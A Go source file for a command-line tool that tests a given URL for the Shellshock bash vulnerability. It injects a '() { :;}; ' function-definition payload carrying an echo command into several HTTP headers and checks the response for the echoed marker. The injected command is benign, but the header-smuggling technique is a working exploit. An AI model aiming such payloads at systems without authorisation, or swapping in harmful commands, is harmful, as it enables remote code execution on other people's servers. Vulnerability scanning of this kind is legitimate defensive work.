package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"reflect"
)

const (
	PAYLOAD_PREFIX = "() { :;}; "
	PAYLOAD_ECHO   = `echo "Content-Type": "text/html"; echo; echo 'oh noes, vuln'`
)

func main() {
	url := flag.String("url", "", "The URL to check.")
	verbose := flag.Bool("verbose", false, "If true, the response body will be printed.")
	flag.Parse()
	if *url == "" {
		flag.Usage()
		return
	}
	vuln, err := bashit(*url, *verbose)
	if err != nil {
		log.Fatal(err)
	}
	if vuln {
		fmt.Printf("%s appears vulnerable to shellshock.\n", *url)
	} else {
		fmt.Printf("%s does not appear vulnerable to shellshock.\n", *url)
	}
}

func setHeaders(r *http.Request) *http.Request {
	headers := []string{"User-Agent", "Host", "Cookie", "Host", "Referer"}
	for _, v := range headers {
		r.Header.Set(v, PAYLOAD_PREFIX+PAYLOAD_ECHO)
	}
	return r
}

func bashit(url string, verbose bool) (bool, error) {
	req, err := http.NewRequest("GET", url, nil)
	setHeaders(req)
	c := &http.Client{}
	resp, err := c.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == http.StatusNotFound {
		return false, errors.New("URL returned status code 404 (not found)")
	}
	if verbose {
		fmt.Printf("%s\n", body)
	}
	if reflect.DeepEqual(body[:13], []byte("oh noes, vuln")) {
		return true, nil
	}
	return false, nil
}
